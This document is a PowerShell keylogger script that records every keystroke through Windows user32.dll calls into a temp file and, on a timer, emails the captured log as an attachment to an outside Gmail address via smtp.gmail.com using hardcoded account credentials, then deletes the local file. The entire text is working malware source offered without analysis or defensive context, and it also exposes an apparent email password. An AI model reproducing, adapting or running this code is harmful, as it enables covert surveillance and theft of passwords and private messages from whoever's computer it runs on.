$TimesToRun = 2
$RunTimeP = 1
$From = "powershellwindows.bot@gmail.com"
$Pass = "f278e8477dbc8"
$To = "nobodyemil@gmail.com"
$Subject = "Keylogger Results"
$body = "Keylogger Results im Anhang"
$SMTPServer = "smtp.gmail.com"
$SMTPPort = "587"
$credentials = new-object Management.Automation.PSCredential $From, ($Pass | ConvertTo-SecureString -AsPlainText -Force)

function Start-KeyLogger($Path="$env:temp\keylogger.txt") 
{
  # Signatures for API Calls
  $signatures = @'
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
public static extern short GetAsyncKeyState(int virtualKeyCode); 
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int GetKeyboardState(byte[] keystate);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int MapVirtualKey(uint uCode, int uMapType);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
'@

  $API = Add-Type -MemberDefinition $signatures -Name 'Win32' -Namespace API -PassThru
    
  $null = New-Item -Path $Path -ItemType File -Force

  try
  {

    $Runner = 0
	while ($TimesToRun  -gt $Runner) {
	$TimeStart = Get-Date
	$TimeEnd = $timeStart.addminutes($RunTimeP)
	while ($TimeEnd -gt $TimeNow) {
      Start-Sleep -Milliseconds 40

      for ($ascii = 9; $ascii -le 254; $ascii++) {

        $state = $API::GetAsyncKeyState($ascii)

        if ($state -eq -32767) {
          $null = [console]::CapsLock

          $virtualKey = $API::MapVirtualKey($ascii, 3)

          $kbstate = New-Object Byte[] 256
          $checkkbstate = $API::GetKeyboardState($kbstate)

          $mychar = New-Object -TypeName System.Text.StringBuilder

          $success = $API::ToUnicode($ascii, $virtualKey, $kbstate, $mychar, $mychar.Capacity, 0)

          if ($success) 
          {
            [System.IO.File]::AppendAllText($Path, $mychar, [System.Text.Encoding]::Unicode) 
          }
        }
      }
	  $TimeNow = Get-Date
    }
	$Runner++
	send-mailmessage -from $from -to $to -subject $Subject -body $body -Attachment $Path -smtpServer $smtpServer -port $SMTPPort -credential $credentials -usessl
	Remove-Item -Path $Path -force
	}
  }
  finally
  {
	exit 1
  }
}

Start-KeyLogger
